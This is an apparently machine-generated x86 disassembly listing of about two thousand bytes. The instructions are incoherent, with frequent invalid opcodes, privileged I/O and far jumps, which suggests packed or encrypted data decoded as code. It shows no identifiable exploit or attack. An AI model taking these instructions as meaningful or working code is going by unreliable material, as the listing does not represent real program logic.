  4136e4:	push   ebx
  4136e5:	or     eax,0xc1ea2742
  4136ea:	loopne 0x4136d0
  4136ec:	sbb    al,dh
  4136ee:	bsr    esp,esp
  4136f1:	(bad)  
  4136f2:	fbstp  TBYTE PTR [edi]
  4136f4:	lahf   
  4136f5:	adc    dh,BYTE PTR fs:[esi-0x27]
  4136f9:	enterw 0xddc9,0x58
  4136fe:	dec    ebx
  4136ff:	adc    eax,0x21b6e9e3
  413704:	adc    bl,BYTE PTR [ecx+esi*2]
  413707:	outs   dx,DWORD PTR ds:[esi]
  413708:	inc    edx
  413709:	add    edi,0xcbc5178a
  41370f:	aad    0x22
  413711:	mov    DWORD PTR [eax+0x1b076039],esi
  413717:	pushf  
  413718:	inc    esi
  413719:	scas   eax,DWORD PTR es:[edi]
  41371a:	add    al,0x21
  41371c:	enter  0x1efc,0x8c
  413720:	ud0    edx,DWORD PTR [edx-0x6d]
  413724:	adc    edx,DWORD PTR [ecx+0x47]
  413727:	mov    ds:0x87e28dec,al
  41372c:	jge    0x4136ec
  41372e:	loope  0x413714
  413730:	pop    esi
  413731:	and    bh,bl
  413733:	lods   al,BYTE PTR ds:[esi]
  413734:	xor    al,0xdc
  413736:	inc    esi
  413737:	mul    BYTE PTR [edi+0x5fef2f44]
  41373d:	dec    ebx
  41373e:	cs xchg ecx,eax
  413740:	lahf   
  413741:	loop   0x413705
  413743:	mov    cl,0x52
  413745:	(bad)  
  413747:	inc    eax
  413748:	addr16 fwait
  41374a:	and    BYTE PTR [edx+ebx*1],dl
  41374d:	pop    ebp
  41374e:	mov    esp,0x480b5f9d
  413753:	pop    edi
  413754:	cmc    
  413755:	adc    DWORD PTR [ebx+0x29],ebp
  413758:	xor    DWORD PTR [ecx],eax
  41375a:	sahf   
  41375b:	retf   
  41375c:	push   esp
  41375d:	imul   edx,DWORD PTR [ebx+esi*2],0xffffffd5
  413761:	sbb    DWORD PTR [edi],0x3f
  413764:	iret   
  413765:	pop    ecx
  413766:	inc    ebx
  413767:	lea    esi,[edx+0x56]
  41376a:	jne    0x413750
  41376c:	loope  0x413751
  41376e:	sub    ecx,ebp
  413770:	mov    ecx,0x1a6e92d9
  413775:	mov    al,0xe1
  413777:	lock js 0x4137a8
  41377a:	stos   BYTE PTR es:[edi],al
  41377b:	sbb    al,0xf3
  41377d:	push   esi
  41377e:	mov    ebx,cs
  413780:	sub    DWORD PTR [esi],ebx
  413782:	dec    eax
  413783:	(bad)  
  413784:	repz mov gs,WORD PTR [edi-0x60e11b5]
  41378b:	xchg   ebp,eax
  41378c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41378d:	fild   WORD PTR [edx]
  41378f:	mov    WORD PTR [edi],gs
  413791:	mov    bh,0xd8
  413793:	sbb    ch,BYTE PTR [ebx-0x7f6e7ad]
  413799:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41379a:	xchg   edi,eax
  41379b:	mov    ch,0x77
  41379d:	xor    al,BYTE PTR [eax]
  41379f:	stos   BYTE PTR es:[edi],al
  4137a0:	mov    edi,0xe0bc213
  4137a5:	add    eax,0x50ca60a
  4137aa:	inc    ecx
  4137ab:	fs jp  0x4137b0
  4137ae:	xchg   DWORD PTR [edx+0x75],ebp
  4137b1:	sbb    bh,BYTE PTR [eax+esi*4-0x7a48b6d9]
  4137b8:	xchg   esi,eax
  4137b9:	and    BYTE PTR [edi-0x2527fa95],al
  4137bf:	mov    ecx,0x85826ac5
  4137c4:	adc    eax,0xb3c00b
  4137c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137ca:	push   esi
  4137cb:	popf   
  4137cc:	sar    DWORD PTR [eax+0x40d66987],cl
  4137d2:	in     al,0xf4
  4137d4:	inc    ecx
  4137d5:	xchg   DWORD PTR [esi],edx
  4137d7:	mov    edi,edi
  4137d9:	cmp    ebx,DWORD PTR [esi]
  4137db:	data16 out 0x8f,al
  4137de:	mov    eax,ds:0xaae1168
  4137e3:	dec    eax
  4137e4:	or     al,0xf6
  4137e6:	int3   
  4137e7:	adc    eax,0x2ead10d5
  4137ec:	push   es
  4137ed:	ss dec ecx
  4137ef:	mov    cl,0xcd
  4137f1:	or     eax,0xdca74ee6
  4137f6:	imul   esp,DWORD PTR [ebp+0x12],0x1385a12
  4137fd:	cmp    DWORD PTR [eax+0x508dd33f],edi
  413803:	sbb    cl,al
  413805:	sti    
  413806:	jne    0x4137c9
  413808:	sub    cl,dh
  41380a:	mov    bh,0xb0
  41380c:	dec    ecx
  41380d:	xor    al,0x65
  41380f:	fldenv [esp+esi*4]
  413812:	nop
  413813:	cli    
  413814:	dec    edx
  413815:	xor    al,0x18
  413817:	enter  0xb7a9,0x40
  41381b:	inc    ecx
  41381c:	mov    WORD PTR [ebx],fs
  41381e:	outs   dx,BYTE PTR ds:[esi]
  41381f:	push   esi
  413820:	sub    DWORD PTR [ebx-0x39],eax
  413823:	mov    cl,0x52
  413825:	mov    ah,0x33
  413827:	call   0x1393:0x2d0a5005
  41382e:	push   ds
  41382f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413830:	call   0xbed8:0xa8d91f95
  413837:	add    bl,al
  413839:	and    dl,0xe5
  41383c:	cmp    ecx,DWORD PTR ds:[ebp+0x5612d1a9]
  413843:	or     dl,BYTE PTR [edx+0x69]
  413846:	inc    ecx
  413847:	and    al,0xef
  413849:	scas   eax,DWORD PTR es:[edi]
  41384a:	in     eax,0xf2
  41384c:	and    al,0x94
  41384e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41384f:	les    edx,FWORD PTR [esi]
  413851:	xor    esi,DWORD PTR [eax-0x7b713ea7]
  413857:	xchg   DWORD PTR [ebp+0x24433fbe],edx
  41385d:	push   cs
  41385e:	mov    edi,DWORD PTR ds:0x8e7917e8
  413864:	add    BYTE PTR [esi+edi*2-0x752f1294],dh
  41386b:	jb     0x4138c1
  41386d:	enter  0x586,0x64
  413871:	loope  0x41382a
  413873:	pop    eax
  413874:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413875:	or     DWORD PTR cs:[ebp+0x4d3dde12],eax
  41387c:	sar    BYTE PTR [ebx-0x634a7ff5],cl
  413882:	adc    BYTE PTR [edi+0x52f32fa3],0x85
  413889:	inc    esi
  41388a:	sub    cl,bl
  41388c:	cmp    ecx,DWORD PTR [esi]
  41388e:	call   0x6b407677
  413893:	mov    edi,0x6b4e399
  413898:	push   0xffffffe1
  41389a:	lods   al,BYTE PTR ds:[esi]
  41389b:	jo     0x41383e
  41389d:	out    0xa1,al
  41389f:	mov    edx,0x52194c30
  4138a4:	inc    ebx
  4138a5:	rcr    esi,0xf
  4138a8:	mov    edx,0xab0fd51
  4138ad:	test   eax,0x40244b1a
  4138b2:	inc    eax
  4138b3:	and    BYTE PTR [ebp-0x32ebf566],al
  4138b9:	sub    esp,DWORD PTR [edx+0x4e06129]
  4138bf:	add    edx,DWORD PTR cs:[ebp-0x2e30583f]
  4138c6:	cs out 0x47,al
  4138c9:	add    eax,0xdf8ae476
  4138ce:	dec    ecx
  4138cf:	inc    esp
  4138d0:	je     0x413886
  4138d2:	pusha  
  4138d3:	mov    esp,0xf077de67
  4138d8:	leave  
  4138d9:	jmp    0x9652:0x2a18d0d8
  4138e0:	fnstenv [edx]
  4138e2:	mov    edi,0xe6ebd1b
  4138e7:	in     al,dx
  4138e8:	inc    ecx
  4138e9:	mov    eax,ds:0xc2c23881
  4138ee:	jo     0x4138ff
  4138f0:	stc    
  4138f1:	inc    ecx
  4138f2:	dec    ecx
  4138f3:	inc    ebp
  4138f4:	cld    
  4138f5:	aam    0x5d
  4138f7:	xchg   ecx,eax
  4138f8:	push   cs
  4138f9:	push   cs
  4138fa:	mov    ah,BYTE PTR [ebx]
  4138fc:	pop    ecx
  4138fd:	sub    edx,DWORD PTR [ebx+0x3c]
  413900:	(bad)  
  413901:	adc    eax,0x2cef50d8
  413906:	jne    0x4138d0
  413908:	add    bl,BYTE PTR [edx+0x9]
  41390b:	adc    BYTE PTR [eax],ah
  41390d:	jae    0x4138d3
  41390f:	push   edx
  413910:	pop    ebx
  413911:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413912:	aad    0x9a
  413914:	xor    DWORD PTR [edx+esi*4],ebp
  413917:	cwde   
  413918:	mov    eax,0x73560aab
  41391d:	mul    DWORD PTR [ecx-0x63]
  413920:	push   es
  413921:	fpatan 
  413923:	or     ecx,ebp
  413925:	jecxz  0x41395a
  413927:	cs and eax,0x13d1dcb
  41392d:	ja     0x413918
  41392f:	pop    esp
  413930:	xchg   BYTE PTR [ebx+0x76],bh
  413933:	inc    ebx
  413934:	call   0x76e47084
  413939:	aas    
  41393a:	mov    ecx,0xaab4f139
  41393f:	leave  
  413940:	leave  
  413941:	mov    ebx,0x78bfd447
  413946:	int3   
  413947:	(bad)  
  413949:	ror    DWORD PTR [esi],0xec
  41394c:	mov    ebx,?
  41394e:	jmp    0x9a348c9d
  413953:	call   0xa02a0063
  413958:	push   ecx
  413959:	push   ss
  41395a:	xchg   ebx,eax
  41395b:	fidiv  DWORD PTR [esi]
  41395d:	call   0xc97e9bdf
  413962:	inc    edi
  413963:	scas   eax,DWORD PTR es:[edi]
  413964:	in     eax,dx
  413965:	push   ebp
  413966:	in     al,0x2
  413968:	xchg   esi,eax
  413969:	lahf   
  41396a:	xlat   BYTE PTR ds:[ebx]
  41396b:	jb     0x41398c
  41396d:	jmp    0x7cbcc3db
  413972:	push   edi
  413973:	sub    eax,0xf167076e
  413978:	xor    ebx,DWORD PTR [ebx+edx*2-0x42]
  41397c:	es pop esp
  41397e:	cmp    eax,0x6de0cfb8
  413983:	test   BYTE PTR [eax+0x27],cl
  413986:	pop    esp
  413987:	(bad)  
  413988:	stc    
  413989:	xchg   DWORD PTR [edx-0x26cab556],edi
  41398f:	(bad)  
  413990:	push   esi
  413991:	popf   
  413992:	xchg   ecx,eax
  413993:	cli    
  413994:	push   cs
  413995:	mov    al,ds:0xecd315cd
  41399a:	cdq    
  41399b:	or     al,0x4
  41399d:	pop    edi
  41399e:	cwde   
  41399f:	jae    0x4139b3
  4139a1:	aam    0xe9
  4139a3:	push   esi
  4139a4:	sub    al,0x9d
  4139a6:	retf   
  4139a7:	mov    edx,0x147f01bf
  4139ac:	push   es
  4139ad:	push   edi
  4139ae:	add    ebp,DWORD PTR [esi]
  4139b0:	sub    DWORD PTR [edx],esp
  4139b2:	mov    dl,BYTE PTR [eax+eax*1+0x5ea41c6f]
  4139b9:	int    0x42
  4139bb:	test   DWORD PTR [ebx+0x27f26b5a],0x9e8b88ba
  4139c5:	test   DWORD PTR [edx],ebp
  4139c7:	daa    
  4139c8:	sub    BYTE PTR [ebx-0x3a7c78d3],dh
  4139ce:	ret    
  4139cf:	ss out 0x4c,eax
  4139d2:	or     edx,edx
  4139d4:	test   DWORD PTR [edi],0x1d86163e
  4139da:	shr    DWORD PTR [eax+0x62],1
  4139dd:	jae    0x41397a
  4139df:	repnz dec esp
  4139e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139e2:	jmp    0x413984
  4139e4:	xchg   ebx,eax
  4139e5:	mov    BYTE PTR [edx+0x3a],dl
  4139e8:	mov    esp,0x240963b1
  4139ed:	jbe    0x7edcf92f
  4139f3:	into   
  4139f4:	mov    ds:0xa2a8d01e,al
  4139f9:	(bad)  
  4139fa:	rcl    BYTE PTR [ebx-0x1c],cl
  4139fd:	push   eax
  4139fe:	or     DWORD PTR [ecx+ebx*4+0x6c],edi
  413a02:	loope  0x413a3d
  413a04:	sbb    eax,0xe2f58039
  413a09:	std    
  413a0a:	add    eax,0xb02a42f0
  413a0f:	ins    BYTE PTR es:[edi],dx
  413a10:	mov    bh,0x2b
  413a12:	adc    DWORD PTR [ebx-0x638346a7],eax
  413a18:	cmp    al,0x38
  413a1a:	inc    edx
  413a1b:	adc    DWORD PTR [edi],esi
  413a1d:	enter  0xac84,0xbc
  413a21:	in     eax,dx
  413a22:	jg     0x4139c3
  413a24:	jp     0x413a82
  413a26:	push   edi
  413a27:	popa   
  413a28:	sub    al,0x45
  413a2a:	(bad)  
  413a2b:	sub    al,0x88
  413a2d:	pop    ecx
  413a2e:	daa    
  413a2f:	dec    esi
  413a30:	jmp    0x413a6d
  413a32:	(bad)  
  413a33:	enter  0x474b,0x2a
  413a37:	das    
  413a38:	mov    ecx,0xd5ecf0fb
  413a3d:	mov    es,ecx
  413a3f:	cmc    
  413a40:	pop    ss
  413a41:	and    al,0x14
  413a43:	out    dx,eax
  413a44:	jle    0x413a39
  413a46:	vcvtss2sd xmm5,xmm1,DWORD PTR [ebp+ebx*1+0x0]
  413a4c:	add    ebx,DWORD PTR [edx+0x7a]
  413a4f:	popa   
  413a50:	sbb    DWORD PTR [edx-0x2e],esi
  413a53:	sub    ch,bl
  413a55:	mov    edx,0x6c53b04e
  413a5a:	scas   al,BYTE PTR es:[edi]
  413a5b:	out    dx,al
  413a5c:	int3   
  413a5d:	jnp    0x413ab2
  413a5f:	adc    eax,0x442800a
  413a64:	(bad)  [edx-0x4001c115]
  413a6a:	pop    esp
  413a6b:	in     eax,0x30
  413a6d:	leave  
  413a6e:	inc    eax
  413a6f:	dec    esi
  413a70:	xchg   ebx,eax
  413a71:	jmp    0x3bc2a39e
  413a76:	test   eax,0x30699888
  413a7b:	sbb    edi,DWORD PTR [eax]
  413a7d:	or     BYTE PTR [ebx],ah
  413a7f:	mov    ch,bl
  413a81:	dec    edi
  413a82:	ror    BYTE PTR [ebp+0x71],1
  413a85:	cmp    bl,dh
  413a87:	sub    DWORD PTR [edx-0x9],edi
  413a8a:	xchg   edx,eax
  413a8b:	push   cs
  413a8c:	cdq    
  413a8d:	int3   
  413a8e:	mov    DWORD PTR [esi],esi
  413a90:	aam    0x67
  413a92:	dec    eax
  413a93:	add    al,0x30
  413a95:	mov    edx,0x48103b8
  413a9a:	lea    esi,[eax-0x1db554c3]
  413aa0:	and    dh,dh
  413aa2:	jbe    0x413a69
  413aa4:	push   ecx
  413aa5:	xchg   edx,eax
  413aa6:	sub    BYTE PTR [ecx+0x7b5ff82a],0x6b
  413aad:	fdivr  DWORD PTR [edx]
  413aaf:	pop    ebp
  413ab0:	push   ecx
  413ab1:	or     BYTE PTR ds:0x937dd497,dl
  413ab7:	mov    ds:0x3d411de7,eax
  413abc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413abd:	xchg   esp,eax
  413abe:	push   ss
  413abf:	and    al,0x3a
  413ac1:	data16 sub al,0x1f
  413ac4:	xchg   bx,ax
  413ac6:	ret    0x1c36
  413ac9:	hlt    
  413aca:	xchg   edi,eax
  413acb:	pop    esp
  413acc:	push   es
  413acd:	mov    bh,0x6b
  413acf:	inc    eax
  413ad0:	aad    0x26
  413ad2:	and    dl,BYTE PTR [edx+0x44]
  413ad5:	js     0x413a72
  413ad7:	lds    esp,FWORD PTR [eax+esi*2]
  413ada:	add    BYTE PTR [ebx],0xa2
  413add:	xchg   esi,eax
  413ade:	sub    eax,DWORD PTR [eax+0x5471a60b]
  413ae4:	dec    eax
  413ae5:	daa    
  413ae6:	loopne 0x413ada
  413ae8:	inc    ebp
  413ae9:	fistp  QWORD PTR [eax-0x6f7833bf]
  413aef:	cmp    bh,BYTE PTR [edi+0x60168cfe]
  413af5:	das    
  413af6:	jno    0x413acf
  413af8:	pop    ss
  413af9:	pop    es
  413afa:	pop    edi
  413afb:	and    ebx,DWORD PTR [esi+0xa]
  413afe:	mov    dl,0x99
  413b00:	mov    bh,0x8b
  413b02:	repnz mov dh,0x92
  413b05:	hlt    
  413b06:	fidiv  WORD PTR [edx+ebp*1+0x2]
  413b0a:	xchg   esi,eax
  413b0b:	sbb    bh,BYTE PTR [edi-0x35ea886]
  413b11:	push   es
  413b12:	inc    ebx
  413b13:	lds    ecx,FWORD PTR ds:0x901b1089
  413b19:	and    dh,BYTE PTR [ecx-0x69f66ecb]
  413b1f:	xor    ah,dl
  413b21:	inc    esi
  413b22:	nop
  413b23:	push   ss
  413b24:	ror    DWORD PTR [edi-0x6abb3d43],cl
  413b2a:	(bad)  
  413b2b:	mov    esi,0x9815212e
  413b30:	pop    ebp
  413b31:	and    dh,bh
  413b33:	mov    eax,DWORD PTR [ebp+0x43a3a42d]
  413b39:	fwait
  413b3a:	stos   DWORD PTR es:[edi],eax
  413b3b:	sbb    eax,0xe280355
  413b40:	inc    ecx
  413b41:	fsub   QWORD PTR [edx+esi*2+0x2]
  413b45:	jae    0x413bbf
  413b47:	sti    
  413b48:	mov    bl,al
  413b4a:	push   esi
  413b4b:	push   esi
  413b4c:	jg     0x413ad4
  413b4e:	bound  edi,QWORD PTR [eax-0x7e811cde]
  413b54:	(bad)  
  413b55:	xchg   ecx,eax
  413b56:	push   ss
  413b57:	sar    ebp,0xe
  413b5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b5b:	enter  0x1212,0x4a
  413b5f:	sub    eax,0xa3e43e74
  413b64:	packssdw mm4,QWORD PTR [ebx]
  413b67:	cmp    al,0x8
  413b69:	push   es
  413b6a:	or     DWORD PTR [eax+0x15],ecx
  413b6d:	fstp   QWORD PTR ss:[esp+eax*2+0x18c75aaa]
  413b75:	icebp  
  413b76:	test   al,0xcc
  413b78:	sti    
  413b79:	add    cl,0x4d
  413b7c:	daa    
  413b7d:	(bad)  
  413b7e:	or     al,0xed
  413b80:	scas   eax,DWORD PTR es:[edi]
  413b81:	sahf   
  413b82:	sbb    eax,0xf1376c62
  413b87:	dec    ecx
  413b88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b89:	icebp  
  413b8a:	jmp    DWORD PTR [ebx-0x69891eb7]
  413b90:	and    bh,BYTE PTR [ecx-0x42]
  413b93:	cwde   
  413b94:	repnz push eax
  413b96:	jbe    0x413ba8
  413b98:	cmp    al,0x95
  413b9a:	outs   dx,BYTE PTR ds:[esi]
  413b9b:	pop    ebp
  413b9c:	pop    esi
  413b9d:	out    dx,al
  413b9e:	xchg   edx,eax
  413b9f:	mov    ds:0xd7d991fe,al
  413ba4:	mov    al,ds:0xdd2aaebf
  413ba9:	sbb    dh,BYTE PTR [esi]
  413bab:	ss sbb al,0xed
  413bae:	ret    
  413baf:	jae    0x413b62
  413bb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bb2:	mov    esi,DWORD PTR [edi]
  413bb4:	jbe    0x413c0a
  413bb6:	inc    ebx
  413bb7:	jne    0x413b90
  413bb9:	sti    
  413bba:	lods   eax,DWORD PTR ds:[esi]
  413bbb:	and    ebp,esp
  413bbd:	repnz mov eax,ds:0x3be8d95c
  413bc3:	(bad)  
  413bc4:	dec    ebx
  413bc5:	gs rol bl,cl
  413bc8:	in     al,dx
  413bc9:	fisttp QWORD PTR [edx+eiz*2+0x13]
  413bcd:	pop    esp
  413bce:	push   0xe60148c9
  413bd3:	mov    ah,0xca
  413bd5:	jle    0x413b64
  413bd7:	cdq    
  413bd8:	add    al,BYTE PTR [edx]
  413bda:	addr16 loop 0x413c29
  413bdd:	mov    ebp,0x4c5de817
  413be2:	add    esi,ebp
  413be4:	in     eax,0x32
  413be6:	dec    ecx
  413be7:	xor    edi,esp
  413be9:	scas   al,BYTE PTR es:[edi]
  413bea:	push   ss
  413beb:	or     bl,BYTE PTR [edx-0x36]
  413bee:	fsin   
  413bf0:	pop    esi
  413bf1:	inc    edx
  413bf2:	shl    esi,cl
  413bf4:	xor    edx,DWORD PTR [eax-0x51bac69e]
  413bfa:	jbe    0x413b95
  413bfc:	jecxz  0x413c00
  413bfe:	mov    dh,0xf9
  413c00:	push   eax
  413c01:	xor    DWORD PTR [esp+eiz*2-0x3998bd0d],ebx
  413c08:	repnz and BYTE PTR [edx],ch
  413c0b:	add    edi,DWORD PTR [esi]
  413c0d:	es inc ecx
  413c0f:	or     ebp,ebp
  413c11:	ss push ebx
  413c13:	inc    esp
  413c14:	sbb    ch,BYTE PTR [eax-0x7458cf97]
  413c1a:	xchg   esi,eax
  413c1b:	pop    ebx
  413c1c:	adc    DWORD PTR [edi+0x46398b49],esp
  413c22:	ret    
  413c23:	in     al,dx
  413c24:	sbb    DWORD PTR [ecx],esi
  413c26:	push   edx
  413c27:	cli    
  413c28:	mov    esi,DWORD PTR [eax+0x1d915c80]
  413c2e:	ffreep st(3)
  413c30:	fistp  QWORD PTR [edx]
  413c32:	sbb    al,0xac
  413c34:	leave  
  413c35:	ins    BYTE PTR es:[edi],dx
  413c36:	shl    BYTE PTR [ecx],cl
  413c38:	mov    edx,0xbbb187e8
  413c3e:	mov    esi,0x5c42c6aa
  413c43:	iret   
  413c44:	ins    DWORD PTR es:[edi],dx
  413c45:	repnz pusha 
  413c47:	sbb    DWORD PTR [edx+eax*1+0x71],0x13
  413c4c:	ins    BYTE PTR es:[edi],dx
  413c4d:	xor    eax,0x4a6f2cac
  413c52:	js     0x413c8e
  413c54:	(bad)  
  413c55:	cwde   
  413c56:	push   eax
  413c57:	in     al,0x5e
  413c59:	adc    DWORD PTR [esp+esi*8],0x629c1962
  413c60:	loopne 0x413bed
  413c62:	sub    DWORD PTR [esi-0x36],esi
  413c65:	(bad)  
  413c66:	sbb    eax,0x3c857abe
  413c6b:	mov    eax,0x126d569
  413c70:	sbb    BYTE PTR [edi+eax*2+0x6b],0xf2
  413c75:	lea    ebx,[eax+ebx*4+0x5a]
  413c79:	cmp    ebp,DWORD PTR [ebp-0x4d5d0fdf]
  413c7f:	sub    BYTE PTR [eax],ch
  413c81:	add    al,0x64
  413c83:	push   ss
  413c84:	out    dx,eax
  413c85:	fnsetpm(287 only) 
  413c87:	jge    0x413c53
  413c89:	daa    
  413c8a:	mov    ds:0x63b85da5,eax
  413c8f:	imul   edx,DWORD PTR [esi-0x61],0x5e
  413c93:	retf   
  413c94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c95:	mov    ecx,esp
  413c97:	xchg   edx,edx
  413c99:	aad    0xe3
  413c9b:	jno    0x413c49
  413c9d:	fdiv   DWORD PTR [edx-0x5b]
  413ca0:	lods   al,BYTE PTR ds:[esi]
  413ca1:	shl    DWORD PTR [eax-0x356c795e],0x8
  413ca8:	sar    BYTE PTR [edi+0x58],1
  413cab:	sub    DWORD PTR [eax],eax
  413cad:	mov    ebx,0xd74b05bc
  413cb2:	dec    esi
  413cb3:	inc    eax
  413cb4:	cmp    edx,DWORD PTR [ecx]
  413cb6:	frstor [ecx+0x4475e83a]
  413cbc:	mov    edx,0x1d792b81
  413cc1:	push   ss
  413cc2:	dec    ebx
  413cc3:	or     BYTE PTR [esi+0x536a2c5b],ch
  413cc9:	mov    dl,0x64
  413ccb:	jb     0x413c85
  413ccd:	mov    bl,0xc0
  413ccf:	xchg   ecx,eax
  413cd0:	lods   al,BYTE PTR ds:[esi]
  413cd1:	repz xor eax,0xffaf247d
  413cd7:	pop    eax
  413cd8:	in     al,0xe1
  413cda:	out    dx,eax
  413cdb:	sub    al,0x9b
  413cdd:	nop
  413cde:	jnp    0x413c8c
  413ce0:	push   esp
  413ce1:	push   0x613941a1
  413ce6:	jg     0x413ca6
  413ce8:	push   eax
  413ce9:	push   edi
  413cea:	jnp    0x413d2b
  413cec:	in     al,0x8e
  413cee:	mov    edi,0x78ab1cac
  413cf3:	out    dx,al
  413cf4:	pop    ecx
  413cf5:	xor    eax,0x58c222e1
  413cfa:	popf   
  413cfb:	cmp    DWORD PTR [esi+0x41aa60dd],0xa8ea3726
  413d05:	aad    0x77
  413d07:	add    bh,BYTE PTR [edi]
  413d09:	into   
  413d0a:	add    ah,BYTE PTR [esi+0x2efea6a0]
  413d10:	(bad)  
  413d11:	repz neg cl
  413d14:	aad    0xd8
  413d16:	mov    eax,0x419f73f0
  413d1b:	mov    edi,0x516bcd24
  413d20:	gs in  al,dx
  413d22:	mov    dh,BYTE PTR [edi+0x329ddf48]
  413d28:	test   BYTE PTR [ecx+0x3c],0xd4
  413d2c:	ins    BYTE PTR es:[edi],dx
  413d2d:	jle    0x413da0
  413d2f:	mov    eax,0xdf4388fe
  413d34:	imul   esi,esp,0xa0bf4d29
  413d3a:	out    dx,eax
  413d3b:	test   ebp,edi
  413d3d:	mov    ah,0x4a
  413d3f:	loope  0x413d35
  413d41:	adc    BYTE PTR [edx],cl
  413d43:	lods   al,BYTE PTR ds:[esi]
  413d44:	cmp    dl,bl
  413d46:	jns    0x413d38
  413d48:	push   ecx
  413d49:	dec    eax
  413d4a:	ror    BYTE PTR [edi+0x25],1
  413d4d:	stos   BYTE PTR es:[edi],al
  413d4e:	cdq    
  413d4f:	push   ebp
  413d50:	mov    esp,0x9b0150db
  413d55:	es xchg ebp,eax
  413d57:	cmp    BYTE PTR [ebx-0x5b2fad2c],cl
  413d5d:	pop    esp
  413d5e:	xor    ch,BYTE PTR [eax-0x6e]
  413d61:	ins    DWORD PTR es:[edi],dx
  413d62:	mov    al,0xe2
  413d64:	pop    esi
  413d65:	ins    BYTE PTR es:[edi],dx
  413d66:	mov    ah,0xec
  413d68:	adc    edi,edi
  413d6a:	lock and DWORD PTR [ebx+0x1a86141b],esi
  413d71:	xor    DWORD PTR [esi+0x141f827],ebx
  413d77:	call   0x6d77:0xd185625
  413d7e:	push   ecx
  413d7f:	dec    esp
  413d80:	and    eax,edx
  413d82:	jmp    0x413db1
  413d84:	ins    BYTE PTR es:[edi],dx
  413d85:	adc    esp,DWORD PTR [eax-0x55]
  413d88:	pop    esp
  413d89:	pushf  
  413d8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d8b:	ja     0x413d77
  413d8d:	sub    BYTE PTR [ecx],0x61
  413d90:	mov    cl,0x3c
  413d92:	sub    dl,BYTE PTR [esp+ebp*2+0x571909f7]
  413d99:	adc    al,0x91
  413d9b:	rol    BYTE PTR [eax+ebx*4+0x2562f1be],cl
  413da2:	mov    ch,0xec
  413da4:	jbe    0x413e03
  413da6:	call   0x8cc4:0x62af3761
  413dad:	clc    
  413dae:	int3   
  413daf:	sub    esp,DWORD PTR [edx-0x34f8082e]
  413db5:	jnp    0x413d99
  413db7:	test   al,0x5
  413db9:	dec    esi
  413dba:	adc    edx,DWORD PTR [edi+0x263527d]
  413dc0:	sbb    al,0x91
  413dc2:	sar    DWORD PTR [esi+eax*8],1
  413dc5:	xchg   edi,eax
  413dc6:	imul   DWORD PTR [ecx]
  413dc8:	push   ebx
  413dc9:	xor    eax,0xec3a6250
  413dce:	lea    edi,[edi]
  413dd0:	imul   eax,DWORD PTR [edi],0x7b
  413dd3:	test   DWORD PTR [edx+ecx*8+0x32fe9e83],ebp
  413dda:	push   esi
  413ddb:	mov    ecx,0xbe248a8d
  413de0:	xor    eax,0xb13601fb
  413de5:	inc    ecx
  413de6:	dec    ecx
  413de7:	mov    edx,0xd738d0e8
  413dec:	inc    esi
  413ded:	jecxz  0x413df5
  413def:	mov    al,ds:0xa108f24b
  413df4:	adc    eax,0x1702a9b2
  413df9:	lock push edi
  413dfb:	aam    0x1a
  413dfd:	jmp    0x413e14
  413dff:	pop    ebx
  413e00:	lea    eax,[ebp+eiz*4-0x6d]
  413e04:	arpl   WORD PTR [ebx+0x5c28d08c],dx
  413e0a:	mov    esi,0xd4bee387
  413e0f:	add    DWORD PTR [eax+ecx*8+0x64c2e87],esp
  413e16:	mov    ds:0x1a2a21c8,al
  413e1b:	pop    ebp
  413e1c:	inc    esp
  413e1d:	push   ecx
  413e1e:	cli    
  413e1f:	xchg   esp,eax
  413e20:	cs add eax,ecx
  413e23:	xchg   ebx,eax
  413e24:	shr    DWORD PTR [esi],cl
  413e26:	call   0xfc04:0x4d933bde
  413e2d:	repnz hlt 
  413e2f:	push   0x49
  413e31:	push   edx
  413e32:	jb     0x413e7e
  413e34:	shr    DWORD PTR ds:0xc46ba66e,1
  413e3a:	loop   0x413e3d
  413e3c:	rcr    BYTE PTR [edx],cl
  413e3e:	mov    ds:0x4e085adb,eax
  413e43:	daa    
  413e44:	out    0x50,al
  413e46:	das    
  413e47:	stc    
  413e48:	fist   DWORD PTR [eax-0xc8bac24]
  413e4e:	arpl   WORD PTR [esi+0x59],bx
  413e51:	mov    ah,0x12
  413e53:	inc    edx
  413e54:	repz mov WORD PTR [edi-0x4e],gs
  413e58:	or     esi,0x676f4dc0
  413e5e:	sbb    BYTE PTR [esp+esi*2+0x6da7ac8e],0x1b
  413e66:	imul   ebp,DWORD PTR [edi+ecx*1+0x45],0x30
  413e6b:	bound  edx,QWORD PTR [edi+0x1b]
  413e6e:	sbb    BYTE PTR [esi],al
  413e70:	mov    cs,WORD PTR [esi+0x5e]
  413e73:	div    edx
  413e75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e76:	or     BYTE PTR [ebx],0x21
  413e79:	pop    esp
  413e7a:	and    DWORD PTR ds:0xd4faff67,edi
  413e80:	cld    
  413e81:	inc    ecx
  413e82:	cwde   
  413e83:	pop    ecx
  413e84:	push   ebp
  413e85:	mov    ah,0xdd
  413e87:	leave  
  413e88:	lahf   
  413e89:	fcomp  QWORD PTR [ebx-0x3283664a]
  413e8f:	aas    
  413e90:	and    eax,0x5968f438
  413e95:	push   edx
  413e96:	adc    al,0xe8
  413e98:	inc    esi
  413e99:	pop    edi
  413e9a:	pop    esi
  413e9b:	lea    ecx,[ebx-0x21561cad]
  413ea1:	test   eax,0xde4e7ff0
  413ea6:	adc    eax,0x7d4b81a3
  413eab:	retf   
  413eac:	(bad)  
  413ead:	cwde   
  413eae:	mov    dl,0x12
  413eb0:	push   es
  413eb1:	gs int 0xb6
  413eb4:	push   edx
  413eb5:	pop    ebx
  413eb6:	repz and esp,DWORD PTR ds:0x885572c1
